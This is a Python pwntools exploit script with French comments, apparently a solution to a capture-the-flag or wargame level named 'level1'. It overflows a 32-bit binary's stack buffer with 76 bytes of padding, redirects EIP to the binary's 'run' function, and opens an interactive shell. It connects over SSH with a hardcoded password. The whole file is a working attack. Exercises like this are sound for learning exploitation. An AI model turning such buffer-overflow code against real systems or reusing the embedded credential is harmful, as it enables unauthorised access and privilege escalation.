#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level1"  # Nom d'utilisateur SSH
PASSWORD = "1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a"  # Mot de passe SSH

def get_connection():
    if LOCAL:
        return process(['./Resources/level1'])
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        return shell.process(['/home/user/level1/level1'])

def exploit():
    # Charger le binaire pour obtenir l'adresse de run
    elf = ELF('./Resources/level1')
    
    # Afficher toutes les fonctions disponibles
    print("\nFonctions disponibles dans le binaire:")
    for func in elf.functions:
        print(f"  - {func}: 0x{elf.functions[func].address:x}")
    
    # Obtenir l'adresse de la fonction run
    run_addr = elf.functions['run'].address
    log.info(f"Adresse de la fonction run: 0x{run_addr:x}")
    
    # Établir la connexion
    conn = get_connection()
    
    # Construction du payload
    offset = 76  # Offset trouvé précédemment
    
    # Construction du payload final
    payload = b""
    payload += b"A" * offset        # Padding jusqu'à EIP
    payload += p32(run_addr)        # Adresse de la fonction run
    
    # Envoi du payload
    conn.sendline(payload)
    
    try:
        # Tentative d'obtenir un shell interactif
        conn.interactive()
    except:
        log.failure("L'exploit n'a pas fonctionné")

if __name__ == "__main__":
    exploit()
